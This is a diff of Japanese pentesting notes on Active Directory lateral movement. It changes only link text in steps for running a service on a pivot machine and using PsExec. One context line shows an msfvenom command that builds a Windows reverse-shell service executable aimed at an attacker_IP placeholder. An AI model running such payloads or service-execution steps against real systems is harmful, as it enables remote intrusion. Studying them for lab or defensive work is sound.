@@ -233,7 +233,7 @@ msfvenom -p windows/shell_reverse_tcp -f exe-service LHOST=<attacker_IP> LPORT=<
 	[ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#Linux%20→%20Windows%20w/%20SMB)（windows側でフォルダ用意不要）
 
 3. 足場マシン上でサービス作成と実行
-	[💥Lateral Movement & Persistance in AD](#パターン1%20ユーザー追加（RDP用足場作成）)の`PathName`を`C:\Windows\myservice.exe`に変更し、「サービスの実行」
+	[パターン1: ユーザー追加（RDP用足場作成）](#パターン1%20ユーザー追加（RDP用足場作成）)の`PathName`を`C:\Windows\myservice.exe`に変更し、「サービスの実行」
 
 ---
 
@@ -253,7 +253,7 @@ PsExecはWindows sysinternalsスイートの１つで、telnetのように、管
 
 1. Psexecを足場のマシンに用意する
 	- 🔗[Psexecインストール](https://learn.microsoft.com/ja-jp/sysinternals/downloads/psexec)
-	- 🔗[ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#ファイルの転送)
+	- [ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#ファイルの転送)
 
 2. リモートのマシンで任意のコマンドを実行する
 ```powershell
